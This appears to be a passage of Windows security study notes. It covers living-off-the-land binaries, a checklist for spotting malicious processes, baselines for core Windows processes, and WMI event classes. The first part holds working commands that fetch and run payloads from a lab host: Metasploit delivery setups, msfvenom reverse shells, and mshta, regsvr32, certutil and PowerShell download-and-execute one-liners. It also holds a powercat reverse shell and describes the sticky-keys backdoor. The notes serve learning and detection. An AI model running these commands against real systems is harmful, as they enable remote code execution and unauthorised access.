<li><a href="https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017">https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017</a></li>
<li>Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs).</li>
</ul>
</li>
<li>HTA<ul>
<li>Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a "fully trusted" application.</li>
</ul>
</li>
<li>Mshta.exe (HTA)<ul>
<li>Running HTA( HTML Application) files
  <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hta_server</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hta_server</span><span class="p">)</span> <span class="o">&gt;</span> <span class="k">set</span> <span class="n">srvhost</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hta_server</span><span class="p">)</span> <span class="o">&gt;</span> <span class="k">set</span> <span class="n">lhost</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hta_server</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">mshta</span><span class="p">.</span><span class="n">exe</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="mi">5</span><span class="n">EEiDSd70ET0k</span><span class="p">.</span><span class="n">hta</span>
</pre></div></li>
</ul>
</li>
<li>Rundll32.exe<ul>
<li>Invoke a function exported from a DLL
  <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_delivery</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_delivery</span><span class="p">)</span> <span class="o">&gt;</span> <span class="k">set</span> <span class="n">srvhost</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_delivery</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">rundll32</span><span class="p">.</span><span class="n">exe</span> <span class="err">\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span><span class="err">\</span><span class="n">vabFG</span><span class="err">\</span><span class="n">test</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="mi">0</span>
</pre></div></li>
</ul>
</li>
<li>Regsvr32.exe<ul>
<li>Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry</li>
<li>installed in the %systemroot%\System32</li>
<li>Windows XP and later</li>
<li>Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting</li>
<li>Execute Script Via regsvr32.exe <a href="https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a">https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a</a></li>
<li>Squiblydoo utilizes the binary regsvr32.exe to download an XML file that contains scriptlets for executing code: <a href="https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/">https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/</a></li>
<li>Able to request a .sct file and then execute the included PowerShell command inside
  <div class="codehilite"><pre><span></span><span class="nv">Syntax</span>: <span class="nv">Regsvr32</span> [<span class="o">/</span><span class="nv">s</span>][<span class="o">/</span><span class="nv">u</span>] [<span class="o">/</span><span class="nv">n</span>] [<span class="o">/</span><span class="nv">i</span>[:<span class="nv">cmdline</span>]] <span class="o">&lt;</span><span class="nv">dllname</span><span class="o">&gt;</span>

<span class="o">/</span><span class="nv">u</span> – <span class="nv">Unregister</span> <span class="nv">server</span>
<span class="o">/</span><span class="nv">i</span> – <span class="k">Call</span> <span class="nl">DllInstall</span> <span class="nv">passing</span> <span class="nv">it</span> <span class="nv">an</span> <span class="nv">optional</span> [<span class="nv">cmdline</span>]<span class="c1">; when it is used with /u, it calls dll to uninstall</span>
<span class="o">/</span><span class="nv">n</span> – <span class="k">do</span> <span class="nv">not</span> <span class="k">call</span> <span class="nl">DllRegisterServer</span><span class="c1">; this option must be used with /i</span>
<span class="o">/</span><span class="nv">s</span> – <span class="nv">Silent</span><span class="c1">; display no message boxes</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>
<span class="n">msf</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">web_delivery</span><span class="p">)</span><span class="o">&gt;</span><span class="k">set</span> <span class="n">target</span> <span class="mi">3</span>
<span class="n">msf</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">web_delivery</span><span class="p">)</span><span class="o">&gt;</span> <span class="k">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="n">msf</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">web_delivery</span><span class="p">)</span><span class="o">&gt;</span> <span class="k">set</span> <span class="n">lhost</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span>
<span class="n">msf</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">web_delivery</span><span class="p">)</span><span class="o">&gt;</span><span class="k">set</span> <span class="n">srvhost</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span>
<span class="n">msf</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">web_delivery</span><span class="p">)</span><span class="o">&gt;</span><span class="n">exploit</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">regsvr32</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">n</span> <span class="o">/</span><span class="n">u</span> <span class="o">/</span><span class="n">i</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">xo31Jt5dIF</span><span class="p">.</span><span class="n">sct</span> <span class="n">scrobj</span><span class="p">.</span><span class="n">dll</span>
</pre></div></li>
</ul>
</li>
<li>Certutil.exe
    <div class="codehilite"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">lhost</span><span class="o">=</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span> <span class="n">lport</span><span class="o">=</span><span class="mi">1234</span> <span class="o">-</span><span class="n">f</span> <span class="n">exe</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">exe</span>

<span class="n">certutil</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">exe</span> <span class="n">shell</span><span class="p">.</span><span class="n">exe</span> <span class="o">&amp;</span> <span class="n">shell</span><span class="p">.</span><span class="n">exe</span>
</pre></div></li>
<li>Powershell.exe
    <div class="codehilite"><pre><span></span><span class="nt">git</span> <span class="nt">clone</span> <span class="nt">https</span><span class="o">://</span><span class="nt">github</span><span class="p">.</span><span class="nc">com</span><span class="o">/</span><span class="nt">besimorhino</span><span class="o">/</span><span class="nt">powercat</span><span class="p">.</span><span class="nc">git</span>
<span class="nt">python</span> <span class="nt">-m</span> <span class="nt">SimpleHTTPServer</span> <span class="nt">80</span>

<span class="nt">powershell</span> <span class="nt">-c</span> <span class="s2">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.1.109/powercat.ps1&#39;);powercat -c 192.168.1.109 -p 1234 -e cmd&quot;</span>
</pre></div></li>
<li>Batch Files
    <div class="codehilite"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">cmd</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">reverse_powershell</span> <span class="n">lhost</span><span class="o">=</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span> <span class="n">lport</span><span class="o">=</span><span class="mi">4444</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">.</span><span class="n">bat</span>

<span class="n">powershell</span> <span class="o">-</span><span class="k">c</span> <span class="err">&quot;</span><span class="n">IEX</span><span class="p">((</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.1.109/1.bat&#39;</span><span class="p">))</span>
</pre></div></li>
<li>Cscript
    <div class="codehilite"><pre><span></span><span class="nt">msfvenom</span> <span class="nt">-p</span> <span class="nt">cmd</span><span class="o">/</span><span class="nt">windows</span><span class="o">/</span><span class="nt">reverse_powershell</span> <span class="nt">lhost</span><span class="o">=</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">109</span> <span class="nt">lport</span><span class="o">=</span><span class="nt">1234</span> <span class="nt">-f</span> <span class="nt">vbs</span> <span class="o">&gt;</span> <span class="nt">1</span><span class="p">.</span><span class="nc">vbs</span>
<span class="nt">script</span><span class="p">.</span><span class="nc">exe</span> <span class="s2">&quot;test.vbs&quot;</span>

<span class="nt">powershell</span><span class="p">.</span><span class="nc">exe</span> <span class="nt">-c</span> <span class="s2">&quot;(New-Object System.NET.WebClient).DownloadFile(&#39;http://192.168.1.109/1.vbs&#39;,\&quot;$env:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;$env:temp\test.vbs\&quot;&quot;</span>
</pre></div></li>
<li>Msiexec.exe<ul>
<li>Install MSI packages
<div class="codehilite"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">lhost</span><span class="o">=</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span> <span class="n">lport</span><span class="o">=</span><span class="mi">1234</span> <span class="o">-</span><span class="n">f</span> <span class="n">msi</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">.</span><span class="n">msi</span>

<span class="n">msiexec</span> <span class="o">/</span><span class="n">q</span> <span class="o">/</span><span class="n">i</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">109</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="n">msi</span>
</pre></div></li>
</ul>
</li>
<li>Wmic.exe<ul>
<li>WMI command-line interface that is used for a variety of administrative functions for local and remote machine</li>
<li>can invoke XSL script (eXtensible Stylesheet Language)</li>
<li>koadic:
  <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">stager</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">wmic</span>
<span class="k">set</span> <span class="n">SRVHOST</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">107</span>
<span class="n">run</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">wmic</span> <span class="n">os</span> <span class="k">get</span> <span class="o">/</span><span class="n">FORMAT</span><span class="p">:</span><span class="ss">&quot;http://192.168.1.107:9996/g8gkv.xsl&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Prefetch Files Created<ul>
<li>AT.EXE (scheduled jobs/tasks)</li>
<li>SCHTASKS.EXE (scheduled jobs/tasks)</li>
<li>CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. )</li>
<li>NET.EXE (net view, etc.)</li>
<li>NET1.EXE (net use)</li>
<li>NETSTAT.EXE (netstat -ano)</li>
<li>REG.EXE (reg query and reg add)</li>
<li>SC.EXE (interact with services)</li>
<li>SYSTEMINFO.EXE (system profiling)</li>
<li>TASKKILL.EXE (kill running processes)</li>
<li>TASKLIST.EXE (tasklist /v)</li>
<li>POWERSHELL.EXE (interact with powershell)</li>
<li>NBTSTAT.EXE (profile)</li>
<li>XCOPY.EXE (copy files around)</li>
<li>NSLOOKUP.EXE (profile)</li>
<li>QUSER.EXE (profile)</li>
<li>RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip)</li>
<li>PING.EXE (check connectivity)</li>
<li>FTP.EXE (download/upload)</li>
<li>Various Sysinternal tools (Psexec, sdelete, etc.)</li>
<li>BITSADMIN.EXE (download/upload)</li>
<li>ROUTE.EXE (adding persistent routes)</li>
<li>REGSVR32.EXE (services)</li>
<li>MAKECAB.EXE (compression before exfil)</li>
<li>Originally form: <a href="http://www.sysforensics.org/2014/01/lateral-movement/">http://www.sysforensics.org/2014/01/lateral-movement/</a>. Link is no longer working</li>
</ul>
</li>
<li>Runonce.exe, msdt.exe, Openwith.exe<ul>
<li><a href="https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636">https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636</a></li>
</ul>
</li>
<li>sethc.exe (Sticky keys)<ul>
<li>By replacing the “Sticky Keys” binary, C:\Windows\System32\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. “Sticky Keys” is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates “Sticky Keys” and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).</li>
</ul>
</li>
<li>Base64 encode / decode
    <div class="codehilite"><pre><span></span><span class="n">certutil</span> <span class="o">-</span><span class="n">encode</span> <span class="n">inputfile</span> <span class="n">outputfile</span>
<span class="n">certutil</span> <span class="o">-</span><span class="n">decode</span> <span class="n">inputfile</span> <span class="n">outputfile</span>
</pre></div></li>
<li><code class="codehilite"><span class="n">mpengine</span><span class="p">.</span><span class="n">dll</span></code> (+ mpasbase.vdm mpasdlta.vdm   mpavbase.vdm mpavdlta.vdm)<ul>
<li>Windows Defender - Microsoft Malware Protection Engine</li>
<li>Take buffer of data and decide of malicious or not</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">MPSigStub</span><span class="p">.</span><span class="n">exe</span></code><ul>
<li>Microsoft Malware Protection Signatuee Update Stub  </li>
</ul>
</li>
</ul>
<h2 id="special-file-handling">Special File Handling<a class="headerlink" href="#special-file-handling" title="Permanent link">&para;</a></h2>
<h2 id="important-processes">Important Processes<a class="headerlink" href="#important-processes" title="Permanent link">&para;</a></h2>
<ul>
<li>Checklist - Simple checklist to review while looking for malicious/suspect process activity.<ul>
<li>Check the parent/child relationships of processes.</li>
<li>Check which users names the processes are running under</li>
<li>Check their command line parameters for those processes that use them.</li>
<li>Check their digital signatures</li>
<li>Check their base priorities</li>
<li>Check the location they are being from</li>
<li>Check their spellings</li>
<li>Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days.</li>
<li>When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process.</li>
<li>Check and see if processes that should not be connecting out to the internet are not</li>
<li>Check process privileges</li>
<li>If wscript.exe process is running check the command line of what it is running.</li>
<li>Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc.</li>
<li>If rundll32.exe is running check its command line as well.</li>
<li>"Most" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated.</li>
<li>Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc.</li>
</ul>
</li>
<li>References<ul>
<li><a href="http://sysforensics.org/2014/01/know-your-windows-processes">http://sysforensics.org/2014/01/know-your-windows-processes</a>. Link is not longer working.</li>
<li><a href="https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf">https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf</a></li>
</ul>
</li>
<li>Idle and System<ul>
<li>Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads.</li>
<li>No visible parent processes</li>
<li>System has a static PID of 4</li>
<li>System creates smss.exe</li>
<li>There should only be one system process running</li>
</ul>
</li>
<li>SMSS - Session Manager<ul>
<li>First user mode process</li>
<li>Parent process is System</li>
<li>Base Priority of 11</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>Performs delayed file delete/rename changes</li>
<li>Loads known dlls</li>
<li>Runs from %systemroot%\System32\smss.exe</li>
<li>Creates session 0 (OS services)</li>
<li>Creates session 1 (User session)</li>
<li>Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1</li>
<li>Runs within session 0</li>
<li>Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0.</li>
<li>There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system.</li>
</ul>
</li>
<li>CSRSS.EXE - Client/Server Run<ul>
<li>Windows subsystem process.</li>
<li>Base Priority of 13</li>
<li>%SystemRoot%\system32\csrss.exe</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>Creates/Deletes processes and threads, Temp files, etc.</li>
<li>In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe</li>
<li>One csrss process per session</li>
<li>Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.)</li>
<li>Runs within session 0</li>
</ul>
</li>
<li>WININIT.EXE - Windows Initialization Process<ul>
<li>Parent to services.exe (SCM), lsass.exe and lsm.exe</li>
<li>Created by smss.exe, but since smss.exe exits there is no parent to WININIT.</li>
<li>Base Priority of 13</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>%SystemRoot%\system32\wininit.exe</li>
<li>Performs user-mode initialization tasks</li>
<li>Creates %windir%\temp</li>
<li>Runs within session 0</li>
</ul>
</li>
<li>SERVICES.EXE - Service Control Manager<ul>
<li>Child to WININIT.EXE</li>
<li>Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\CurrentControlSet\Services</li>
<li>%SystemRoot%\System32\wininit.exe</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>Base Priority of 9</li>
<li>Loads a database of services into memory</li>
<li>Runs within session 0</li>
<li>There should only be one services.exe process running</li>
</ul>
</li>
<li>LSASS.EXE - Local Security Authority<ul>
<li>Child to WININIT.EXE</li>
<li>Only one lsass.exe process</li>
<li>%SystemRoot%\System32\lsass.exe</li>
<li>Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc.</li>
<li>Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These "fake" names will not be a children of wininit.exe.</li>
<li>Base Priority of 9</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>Runs within session 0</li>
<li>It should not have child processes</li>
</ul>
</li>
<li>SVCHOST.EXE - Service Hosting Process<ul>
<li>Multiple instances of svchost.exe can/do exist/run</li>
<li>%SystemRoot%\System32\svchost.exe</li>
<li>Username: Should only be one of three options: NT AUTHORITY\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE</li>
<li>Should always have a parent of services.exe</li>
<li>Base Priority of 8</li>
<li>Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe.</li>
<li>Command Line: svchost.exe -k <name></li>
<li>-k <name> values should exist within the Software\Microsoft\Windows NT\CurrentVersion\Svchost registry key</li>
<li>Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3.</li>
<li>They should all be running within session 0</li>
</ul>
</li>
<li>LSM.EXE - Load Session Manager Service<ul>
<li>Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions.</li>
<li>Child to wininit.exe</li>
<li>It should not have child processes</li>
<li>Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop</li>
<li>I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open.</li>
<li>%systemroot%\System32\lsm.exe</li>
<li>Base Priority of 8</li>
<li>Username: NT AUTHORITY\SYSTEM</li>
<li>Runs within session 0</li>
</ul>
</li>
<li>WINLOGON.EXE - Windows Logon Process<ul>
<li>No parent process</li>
<li>Could have a child process of LogonUI if smartcard, etc. are used to authenticate</li>
<li>LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information.</li>
<li>Base Priority of 13</li>
<li>Runs within session one</li>
<li>Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete)</li>
<li>Loads Userinit within Software\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
<li>The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons.</li>
<li>Userinit.exe exits once it runs so you wont see this process running when you look.</li>
<li>Userinit initializes the user environment. This includes running GPOs and logon scripts.</li>
<li>Will run Shell value located at Software\Microsoft\Windows NT\CurrentVersion\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values.</li>
<li>Since Userinit exists this is also why Explorer.exe doesn't have a parent process.</li>
</ul>
</li>
<li>Explorer.exe - AKA Windows Explorer<ul>
<li>No parent process since Userinit.exe exits</li>
<li>The value "Explorer.exe" is stored in shell value within the registry. The registry location is here: Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</li>
<li>Base Priority of 8</li>
<li>Username: The logged on user account.</li>
<li>%Systemroot%\Explorer.exe</li>
<li>This will contain multiple child processes.</li>
<li>Some of you might know this better as, "Windows Explorer"</li>
<li>This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here.</li>
</ul>
</li>
</ul>
<h2 id="windows-api">Windows API<a class="headerlink" href="#windows-api" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Windows_API#Versions">https://en.wikipedia.org/wiki/Windows_API#Versions</a></li>
<li>Using Python on Windows: <a href="https://docs.python.org/3/using/windows.html">https://docs.python.org/3/using/windows.html</a></li>
<li>theForger's Win32 API Programming Tutorial: <a href="http://www.winprog.org/tutorial/">http://www.winprog.org/tutorial/</a></li>
<li>Windows API Reference: <a href="https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN</a></li>
</ul>
<ul>
<li>Network Related<ul>
<li>ARP Table: <code class="codehilite"><span class="n">GetIPNetTable</span></code></li>
</ul>
</li>
<li>Services<ul>
<li>Change Services: <code class="codehilite"><span class="n">ChangeServiceConfigW</span></code></li>
</ul>
</li>
</ul>
<h2 id="wmi">WMI<a class="headerlink" href="#wmi" title="Permanent link">&para;</a></h2>
<ul>
<li>Implementation of <code class="codehilite"><span class="n">Common</span> <span class="n">Information</span> <span class="n">Model</span> <span class="p">(</span><span class="n">CIM</span><span class="p">)</span></code> and <code class="codehilite"><span class="n">Web</span><span class="o">-</span><span class="n">Based</span> <span class="n">Enterprise</span> <span class="n">Management</span> <span class="p">(</span><span class="n">WBEM</span><span class="p">)</span></code></li>
<li><code class="codehilite"><span class="n">WBEM</span></code> standard encompasses the design of an<ul>
<li>extensible enterprise data-collection and data-management facility</li>
<li>that has the flexibility and extensibility</li>
<li>required to manage local and remote systems that comprise arbitrary components  </li>
</ul>
</li>
<li><code class="codehilite"><span class="n">WMI</span></code> consists of four main components:<ul>
<li>management applications</li>
<li>WMI infrastructure</li>
<li>providers</li>
<li>managed objects (system, disks, processes, network components...)</li>
</ul>
</li>
<li>Allows<ul>
<li>Execute some code when the notification of an event</li>
</ul>
</li>
</ul>
<p><img alt="" src="_assets/WMI architecture.png" /></p>
<blockquote>
<ul>
<li><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html</a></li>
</ul>
</blockquote>
<p><img alt="image-20190618124144945" src="_assets/image-20190618124144945.png" /></p>
<blockquote>
<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</a></p>
</blockquote>
<ul>
<li>CIM classes<ul>
<li>hierarchically organized with subclasses</li>
<li>grouped in namespaces (logical group of classes)</li>
<li>root\cimv2 includes most of the classes that represent computer's resources</li>
<li>Categories <ul>
<li><strong>Core Classes</strong> - Applies to all areas of management (__System_Security)</li>
<li><strong>Common Classes</strong> - Extension of core classes (CIM_UnitaryComputerSystem)</li>
<li><strong>Extended Classes</strong> - Technology specific addition to common classes (Win32_ComputerSystem)</li>
</ul>
</li>
<li>Types<ul>
<li><strong>Abstract</strong> - Template classes used to define other classes. </li>
<li><strong>Static</strong> - Stores data <ul>
<li>WMI configuration</li>
<li>Operational data</li>
</ul>
</li>
<li><strong>Dynamic</strong> - Retrieved from a provider, and represents managed resource (process, service, file, etc.)</li>
<li><strong>Association</strong> - Describe relationship between classes or resources. </li>
</ul>
</li>
</ul>
</li>
<li>WMI Provider <ul>
<li>Bridge between managed object and WMI</li>
<li>Provide access to classes </li>
</ul>
</li>
<li>Namespaces <ul>
<li>CIM classes are decided logically using namespaces </li>
<li>For easier discovery and use</li>
<li><code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">cimv2</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="k">default</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="k">security</span></code> <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">subscription</span></code> </li>
</ul>
</li>
<li>WMI repository - stores CIM classes' definitions<ul>
<li><code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\Repository</span></code></li>
</ul>
</li>
</ul>
<h3 id="interesting-cim-classes">Interesting CIM classes<a class="headerlink" href="#interesting-cim-classes" title="Permanent link">&para;</a></h3>
<p>- <a href="http://msdn.microsoft.com/en-us/library/aa394639%28v=vs.85%29.aspx">__EventFilter</a> [<a href="http://msdn.microsoft.com/en-us/library/aa389741%28VS.85%29.aspx">create</a>]: permits to define a Windows event
  - <a href="http://msdn.microsoft.com/en-us/library/aa384749%28VS.85%29.aspx">__EventConsumer</a>: (abstract consumer class)
    - <a href="http://msdn.microsoft.com/en-us/library/aa394635">ActiveScriptEventConsumer</a>: possible to embed VBScript or JSScript in the consumer (only available in <code class="codehilite"><span class="n">root</span><span class="err">\</span><span class="n">subscription</span></code>)
      - Consumer runs with SYSTEM privilege on <code class="codehilite"><span class="n">Windows</span> <span class="n">XP</span></code> and <code class="codehilite"><span class="n">Windows</span> <span class="mi">2003</span> <span class="n">Server</span></code>
      - <code class="codehilite"><span class="n">Vista</span></code>, it is running under the LOCAL_SERVICE user
  - <a href="http://msdn.microsoft.com/en-us/library/aa394647%28v=VS.85%29.aspx">__FilterToConsumerBinding</a>: link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)</p>
